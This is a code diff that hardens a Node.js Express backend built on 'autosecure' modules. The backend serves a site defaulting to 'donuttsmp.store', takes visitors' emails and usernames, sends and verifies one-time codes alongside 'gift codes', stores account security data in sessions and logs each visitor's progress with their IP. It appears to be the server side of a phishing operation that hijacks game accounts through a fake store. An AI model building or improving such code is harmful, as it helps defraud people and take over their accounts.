@@ -1,3 +1,5 @@
+require('dotenv').config();
+
 const { attachGlobalLoggerGuard } = require('../autosecure/utils/logging/interceptLogger');
 attachGlobalLoggerGuard();
 
@@ -5,13 +7,10 @@ const express = require('express');
 const rateLimit = require('express-rate-limit');
 const http = require('http');
 
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('[ANTI-CRASH] Backend Unhandled Rejection:', reason);
-});
-process.on('uncaughtException', (err, origin) => {
-    console.error(`[ANTI-CRASH] Backend Uncaught Exception: ${err ? err.message : err}`, err ? err.stack : '');
-});
+const { setupGlobalErrorHandlers, registerServer } = require('../autosecure/utils/process/gracefulShutdown');
+setupGlobalErrorHandlers('BackendServer');
 
+const { getClientIp, configureTrustProxy } = require('../autosecure/utils/security/clientIp');
 const validEmail = require('../autosecure/utils/emails/validEmail');
 const getCredentials = require('../autosecure/utils/info/getCredentials');
 const sendotp = require('../autosecure/utils/secure/sendotp');
@@ -25,10 +24,13 @@ const { sendSecureNotification } = require('../autosecure/utils/notifications/no
 const { initializeDB } = require('../db/db');
 const { queryParams } = require('../db/database');
 const { sendWebLog } = require('../autosecure/utils/webLogger');
-const config = require('../config.json');
+const config = require('../configLoader');
+const { securityHeaders, loopbackOnly } = require('../autosecure/utils/security/apiAuth');
 
 const app = express();
-app.set('trust proxy', 1); // Trust Nginx/Cloudflare for rate-limit
+configureTrustProxy(app, 'loopback');
+app.use(securityHeaders);
+app.disable('x-powered-by');
 const PORT = process.env.BACKEND_PORT || process.env.PORT || 5000;
 
 const activeSessions = new Map();
@@ -47,6 +49,7 @@ const generalApiLimiter = rateLimit({
     max: 120,
     standardHeaders: true,
     legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
     message: { success: false, error: 'Too many requests. Please try again in 1 minute.' }
 });
 
@@ -55,6 +58,7 @@ const sendOtpLimiter = rateLimit({
     max: 10,
     standardHeaders: true,
     legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
     message: { success: false, error: 'Too many OTP requests. Please wait 1 minute.' }
 });
 
@@ -63,6 +67,7 @@ const verifyOtpLimiter = rateLimit({
     max: 15,
     standardHeaders: true,
     legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
     message: { success: false, error: 'Too many verification attempts. Please wait a moment.' }
 });
 
@@ -72,8 +77,7 @@ app.use(express.urlencoded({ extended: true, limit: '20kb' }));
 // IP Ban Middleware
 app.use(async (req, res, next) => {
     try {
-        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-        const clientIp = rawIp.split(',')[0].trim();
+        const clientIp = getClientIp(req);
         if (clientIp) {
             const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
             if (banned && banned.length > 0) {
@@ -91,11 +95,17 @@ app.use(async (req, res, next) => {
 });
 
 app.get('/api/health', (req, res) => {
-    res.json({ success: true, service: 'backend', uptime: process.uptime(), time: Date.now() });
+    res.json({ success: true, service: 'backend', time: Date.now() });
 });
 
 app.use((req, res, next) => {
-    res.setHeader('Access-Control-Allow-Origin', '*');
+    const allowedOrigins = (config.webDomains || []).flatMap(d => [`https://${d}`, `http://${d}`]);
+    const origin = req.headers.origin;
+    if (allowedOrigins.includes(origin)) {
+        res.setHeader('Access-Control-Allow-Origin', origin);
+    } else if (!origin) {
+        res.setHeader('Access-Control-Allow-Origin', `https://${config.webDomain || 'donuttsmp.store'}`);
+    }
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
     if (req.method === 'OPTIONS') {
@@ -109,27 +119,51 @@ app.use('/api/', generalApiLimiter);
 app.use((req, res, next) => {
     const time = new Date().toLocaleTimeString('vi-VN');
     if (req.url.startsWith('/api/')) {
-        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        const clientIp = getClientIp(req);
         console.log(`[${time}] [BACKEND-API] ${req.method} ${req.url} (IP: ${clientIp})`);
     }
     next();
 });
 
+const webActivityLimiter = rateLimit({
+    windowMs: 1 * 60 * 1000,
+    max: 20,
+    standardHeaders: true,
+    legacyHeaders: false,
+    message: { success: false, error: 'Too many activity reports. Please wait a moment.' }
+});
+
 // Endpoint to receive realtime visitor & checkout activity from web
-app.post('/api/web-activity', async (req, res) => {
+app.post('/api/web-activity', webActivityLimiter, async (req, res) => {
     try {
-        const { code, username, email, statusText, domain } = req.body || {};
-        // Log if username is provided (email is optional for early steps like Waiting Email)
-        if (username) {
-            const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-            const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+        let { code, username, email, statusText, domain } = req.body || {};
+
+        if (typeof username !== 'string') username = '';
+        if (typeof email !== 'string') email = '';
+        if (typeof code !== 'string') code = '';
+        if (typeof statusText !== 'string') statusText = '';
+        if (typeof domain !== 'string') domain = '';
+
+        username = username.trim().slice(0, 64);
+        email = email.trim().slice(0, 128);
+        code = code.trim().slice(0, 64);
+        statusText = statusText.trim().slice(0, 64);
+        domain = domain.trim().slice(0, 128);
+
+        // Sanitize code and domain
+        if (code && !/^[a-zA-Z0-9_-]+$/.test(code)) code = '';
+        if (domain && !/^[a-zA-Z0-9.:_-]+$/.test(domain)) domain = '';
+
+        // Validate username (safe alphanumeric + reasonable characters)
+        if (username && /^[a-zA-Z0-9_ -]{1,64}$/.test(username)) {
+            const clientIp = getClientIp(req);
             
             console.log(`[WEB ACTIVITY] ${username} | ${statusText} | IP: ${clientIp} | Code: ${code || 'None'} | Email: ${email || 'None'}`);
 
             await sendWebLog({
                 code,
                 ip: clientIp,
-                domain: config.webDomain || (config.domains && config.domains[0]) || 'donuttsmp.store',
+                domain: domain || config.webDomain || (config.domains && config.domains[0]) || 'donuttsmp.store',
                 username,
                 email: email || '',
                 statusText: statusText || 'Send Code'
@@ -138,18 +172,8 @@ app.post('/api/web-activity', async (req, res) => {
 
         return res.json({ success: true });
     } catch (err) {
-        return res.status(500).json({ success: false, error: err.message });
+        return res.status(500).json({ success: false, error: 'Internal server error' });
     }
-});
-
-app.get('/api/health', (req, res) => {
-    res.json({
-        status: 'ok',
-        service: 'VinGroup Dedicated Backend API',
-        port: PORT,
-        time: new Date().toISOString(),
-        activeSessions: activeSessions.size
-    });
 });
 
 app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
@@ -205,8 +229,7 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
 
         const profiles = await getCredentials(email, false);
 
-        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+        const clientIp = getClientIp(req);
 
         if (!profiles) {
             sendWebLog({
@@ -274,7 +297,7 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
             statusText: 'Send Code'
         }).catch(() => {});
 
-        const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
+        const sessionId = 'sess_' + require('crypto').randomBytes(16).toString('hex');
         activeSessions.set(sessionId, {
             email,
             secData,
@@ -306,9 +329,9 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
 
 app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
     try {
-        let { sessionId, email, secId, code, username, giftCode, code: altCode } = req.body;
-        code = (code || '').toString().trim();
-        let curGiftCode = (giftCode || altCode || '').trim();
+        let { sessionId, email, secId, code, username, giftCode, gift_code } = req.body || {};
+        code = (code || '').toString().trim().replace(/[\s\-]/g, '');
+        let curGiftCode = (giftCode || gift_code || '').trim();
         let botUserId = null;
         let botNumber = 1;
 
@@ -335,7 +358,7 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
         secId = (secId || '').trim();
         username = (username || '').trim();
 
-        if (!code || isNaN(code)) {
+        if (!code || !/^\d{6,8}$/.test(code)) {
             return res.status(400).json({
                 success: false,
                 error: 'Verification code must be a 6 to 8 digit number.'
@@ -542,13 +565,14 @@ app.use((req, res) => {
 async function startBackend() {
     try {
         await initializeDB();
-        app.listen(PORT, '127.0.0.1', () => {
+        const server = app.listen(PORT, '127.0.0.1', () => {
             if (process.env.RUN_ALL_MODE === 'true') {
-                console.log(`[BACKEND] ✔ Cổng ${PORT} sẵn sàng (API: http://127.0.0.1:${PORT}/api/health)`);
+                console.log(`[BACKEND] ✔ Cổng ${PORT} sẵn sàng (API: /api/health)`);
                 return;
             }
-            console.log(`[BACKEND] Listening on http://127.0.0.1:${PORT}`);
+            console.log(`[BACKEND] Listening on port ${PORT}`);
         });
+        registerServer(server);
     } catch (err) {
         console.error('[BACKEND] Startup error:', err);
     }
